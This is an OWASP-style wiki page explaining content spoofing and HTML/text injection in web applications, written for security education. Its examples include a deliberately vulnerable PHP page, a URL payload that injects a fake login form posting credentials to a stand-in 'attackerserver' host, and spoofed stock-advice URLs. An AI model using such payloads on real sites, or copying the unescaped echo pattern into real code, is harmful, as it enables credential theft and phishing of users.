---
layout: col-sidebar
title: Content Spoofing
author: Andrew Smith
contributors: Jmanico, Wichers, D0ubl3 h3lix, Rishu Ranjan, ADubhlaoich
permalink: /attacks/Content_Spoofing
tags: attack, Content Spoofing

---

{% include writers.html %}

## Description

Content spoofing, also referred to as _content injection_, "arbitrary
text injection" or _virtual defacement_, is an attack targeting a user
made possible by an injection vulnerability in a web application. When
an application does not properly handle user-supplied data, an attacker
can supply content to a web application, typically via a parameter
value, that is reflected back to the user. This presents the user with a
modified page under the context of the trusted domain.
This attack is typically used as, or in conjunction with, social
engineering because the attack is exploiting a code-based vulnerability
and a user's trust. As a side note, this attack is widely misunderstood
as a kind of bug that brings no impact.

> Attack Type: Client-Side

## Risk Factors

Risk factors depend on the business type of the application. If the
application business brand is well known and has major competitors, this
issue can be abused by malicious competitors/disgruntled
employees/unsatisfied customers to trigger mass distributions of false
messages to unsuspecting customers. Another factor that heightens the
risk is by doing SEO injection in a way that search engines crawl and
index crafted URLs with falsified messages.

By doing so, customers could be forced to switch to competitor's
products. This could lead to loss of monetary value until rectification
is properly done by the victim business. For public traded companies,
its shares will be falling down, leading to uncontrolled loss of
millions.

![Fake text](../assets/images/Fake-text.png)

## Attack Scenario

An attacker compromised social accounts which have thousands of
followers and distribute misleading Content Spoofing payload via
Twitter/Facebook/Instagram/ similar popular channel. This will lead
media to assume news is correct and create headline stories.

## Audit Guideline

Text injection can be easily found if:

1. User input via parameter or directly in the URL is reflected in the page response
2. Content-Type: text/plain
3. Application is giving default error pages

## Applicable Industries

- A business entity selling one type of product as a major business function

For example, Taxi hailing business, Online shopping business, Online service business

- A business entity relying on the brand name

For example, Cosmetic brand, Airline brand

## [Threat Agents](Threat_Agents "wikilink")

- Malicious competitors
- Disgruntled employees
- Unsatisfied customers
- Scammers

## Content Spoofing vs. Cross-site Scripting

Content spoofing is an attack that is closely related to [Cross-site Scripting (XSS)](/xss). While XSS
uses `<script>` and other techniques to run JavaScript, content spoofing uses other techniques to modify the page for malicious reasons.

Even if XSS mitigation techniques are used within the web application,
such as proper output encoding, the application can still be vulnerable
to text based content spoofing attacks.

## Examples

### Hypertext Markup Language (HTML) Injection

A possible attack scenario is demonstrated below. For this scenario,
lets assumes no output encoding is being implemented:

1. Attacker discovers injection vulnerability and decides to spoof a login form
2. Attacker crafts malicious link, including their injected HTML content, and sends it to a user via email
3. The user visits the page due to the page being located within a trusted domain
4. The attacker's injected HTML is rendered and presented to the user asking for a username and password
5. The user enters a username and password, which are both sent to the attackers server

- A simple PHP page containing an injection vulnerability via the `name` parameter:

```php
<?php
    $name = $_REQUEST ['name'];
?>
<html>
    <h1>Welcome to the Internet!</h1>
    <br>
    <body>
            Hello, <?php echo $name; ?>!
        <p>We are so glad you are here!</p>
    </body>
</html>
```

The page functionality can be tested by making the following GET request
to the page: `http://127.0.0.1/vulnerable.php?name=test`

By requesting the link below, the page renders the injected HTML,
presents a login form, and comments out the rest of the page after the
injection point. Once a user enters their username and password, the
values are sent to a page named `login.php` on the attacker's server via
POST.

```
http://127.0.0.1/vulnerable.php?name=<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST"
action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password"
name="password" /><br /><input type="submit" value="Login" /></form><!--
```

### Text Injection

Another example of a content spoofing attack would be to present false
information to a user via text manipulation. An attack scenario is
demonstrated below. For this scenario, lets assume proper output
encoding HAS been implemented and XSS is not possible:

1. An attacker identifies a web application that gives recommendations to its users on whether they should buy or sell a particular stock
2. The attacker identifies a vulnerable parameter
3. The attacker crafts a malicious link by slightly modifying a valid request
4. The link containing the modified request is sent to a user and they clicks the link
5. A valid webpage is created using the attackers malicious recommendation and the user believes the recommendation was from the stock website

**Valid Page**

`http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Recommend+You+Buy+Now`

**Modified Page**

`http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Really+Recommend+You+Sell+This+Stock+Now`

Other example:

**Modified Page**

`http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=Our+site+has+experienced+major+hacking+incident.Please+use+our+competitor+site+http://www.competitor.com+until+we+further+announced+for+update.`

## Related [Controls](https://owasp.org/www-community/controls/)

- [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## References

- [CAPEC - 148](http://capec.mitre.org/data/definitions/148.html)
- [WASC - Content Spoofing](http://projects.webappsec.org/w/page/13246917/Content%20Spoofing)
- [Content Injection Attack](http://itlaw.wikia.com/wiki/Content_injection_attack)
- [CERT Advisory on Malicious HTML Tags](http://www.cert.org/advisories/CA-2000-02.html)
- OWASP's [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HTML Code Injection and Cross-site Scripting](http://www.technicalinfo.net/papers/CSS.html)
- [Case studies (Spotify, LinkedIn, ..etc)](https://twitter.com/ncweaver/status/974802236567007232?s=12)

[Category:Injection](https://owasp.org/www-community/Injection_Flaws)
